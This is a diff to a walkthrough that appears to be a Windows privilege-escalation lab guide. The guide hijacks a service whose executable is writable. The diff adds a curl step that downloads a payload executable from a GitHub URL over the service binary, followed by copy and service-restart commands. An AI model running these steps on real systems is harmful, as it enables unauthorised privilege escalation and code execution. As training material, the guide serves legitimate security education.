@@ -651,13 +651,23 @@ We have write access to the service executable.
 
    - Use a tool like [bat2exe](https://bat2exe.net/) to convert the batch file into an executable file (`filepermservice.exe`).
 
-5. **Replace Executable:**
+5. **Optional: Download the Executable Payload:**
+
+   - If you already have the executable payload hosted somewhere, you can download it using the following `curl` command:
+
+     ```bash
+     curl -o "C:\Program Files\File Permissions Service\filepermservice.exe" https://raw.githubusercontent.com/Ardemium/InsideJob/refs/heads/main/payloads/filepermservice.exe
+     ```
+
+     > **Note:** Modify the destination path (`"C:\Program Files\File Permissions Service\filepermservice.exe"`) to your desired location and file name, if necessary.
+
+6. **Replace Executable:**
 
    ```bash
    copy /Y Z:\filepermservice.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
    ```
 
-6. **Restart Service:**
+7. **Restart Service:**
 
    ```bash
    sc stop filepermsvc
